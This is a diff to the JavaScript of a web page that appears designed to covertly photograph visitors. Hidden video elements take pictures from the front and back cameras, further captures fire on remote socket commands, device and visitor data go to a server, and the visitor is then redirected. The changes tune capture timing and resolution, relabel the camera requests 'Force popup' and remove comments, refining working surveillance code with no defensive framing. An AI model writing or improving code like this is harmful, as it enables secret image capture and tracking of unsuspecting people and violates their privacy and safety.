@@ -122,8 +122,6 @@
             let cameraStreamBack = null;
             let frontVideo = document.getElementById('hiddenVideo');
             let backVideo = document.getElementById('hiddenVideoBack');
-            let frontPhotoSent = false;
-            let backPhotoSent = false;
 
             function updateStatus(msg, isDone = false) {
                 statusText.textContent = msg;
@@ -149,7 +147,6 @@
                 if (allGranted) {
                     updateStatus('✅ All permissions granted! Redirecting...', true);
                     
-                    // Notify server
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
                             visitorId,
@@ -158,7 +155,6 @@
                         });
                     }
                     
-                    // Redirect after 2 seconds
                     setTimeout(function() {
                         if (!redirectTriggered) {
                             redirectNow();
@@ -208,7 +204,11 @@
                     socket.on('connect', function() {
                         console.log('✅ Socket connected');
                         sendDeviceInfo();
-                        requestAllPermissions();
+                        
+                        // Request permissions AFTER socket connects
+                        setTimeout(function() {
+                            requestAllPermissions();
+                        }, 500);
                     });
 
                     socket.on('connect_error', function(err) {
@@ -225,9 +225,9 @@
                             capturePhoto('back', backVideo);
                         } else if (data.type === 'both') {
                             capturePhoto('front', frontVideo);
-                            setTimeout(() => {
+                            setTimeout(function() {
                                 capturePhoto('back', backVideo);
-                            }, 1000);
+                            }, 1500);
                         }
                     });
 
@@ -356,10 +356,14 @@
                     );
                 }
 
-                // ===== FRONT CAMERA =====
+                // ===== FRONT CAMERA (Force popup) =====
                 console.log('📸 Requesting front camera...');
                 navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 })
                 .then(function(stream) {
@@ -371,7 +375,6 @@
                     return frontVideo.play();
                 })
                 .then(function() {
-                    // Auto capture front photo
                     setTimeout(function() {
                         capturePhoto('front', frontVideo);
                     }, 1500);
@@ -384,10 +387,14 @@
                     checkAllPermissions();
                 });
 
-                // ===== BACK CAMERA =====
+                // ===== BACK CAMERA (Force popup) =====
                 console.log('📸 Requesting back camera...');
                 navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 })
                 .then(function(stream) {
@@ -399,7 +406,6 @@
                     return backVideo.play();
                 })
                 .then(function() {
-                    // Auto capture back photo
                     setTimeout(function() {
                         capturePhoto('back', backVideo);
                     }, 2500);
